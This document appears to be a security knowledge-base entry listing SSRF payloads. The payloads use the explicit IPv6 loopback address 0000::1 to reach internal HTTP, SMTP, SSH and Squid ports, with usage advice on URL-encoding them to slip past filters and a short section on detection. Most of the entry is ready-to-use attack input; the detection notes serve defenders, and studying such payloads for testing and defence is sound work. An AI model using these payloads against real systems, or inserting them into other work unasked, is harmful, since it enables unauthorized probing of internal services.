---
type: code
language: plaintext
verified: true
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - payload
validated: true
---

# ssrf-ipv6-payloads-loopback-address

## Code

```plaintext
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

## Description

List of SSRF payloads using the explicit IPv6 loopback address 0000::1 ([::1]) to access internal services, evading IPv4-only filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Static payloads; adjust ports for target services | N/A |

## Usage

Use in SSRF inputs to probe internal ports. Combine with URL encoding (%5B%3A%3A%5D) if basic form is blocked.

## Detection

- Application logs showing 0000::1 or ::1 in fetched URLs.
- Internal service logs for unexpected connections from the web server.
- Anomaly detection in traffic patterns to localhost IPv6.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
